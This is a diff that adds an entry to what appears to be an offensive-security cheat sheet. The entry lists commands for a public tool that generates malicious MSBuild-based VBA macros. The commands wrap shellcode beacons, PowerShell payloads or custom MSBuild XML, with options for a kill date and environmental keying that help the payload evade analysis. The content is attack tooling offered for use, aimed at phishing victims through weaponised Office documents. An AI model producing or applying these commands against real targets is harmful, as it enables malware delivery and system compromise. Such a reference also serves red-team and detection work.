@@ -668,6 +668,27 @@ go
 ```
 
 
+#### [](#header-4) Malicious Macro with MSBuild
+
+```powershell
+#https://github.com/infosecn1nja/MaliciousMacroMSBuild
+
+Creation of a Shellcode MSBuild VBA Macro
+python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba
+
+Creation of a PowerShell MSBuild VBA Macro
+python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba
+
+Creation of a Custom MSBuild VBA Macro
+python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba
+
+Creation of a Shellcode MSBuild VBA Macro With Kill Date
+python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018
+
+Creation of a Shellcode MSBuild VBA Macro With Environmental Keying
+python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain
+python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github
+```
 
 
 
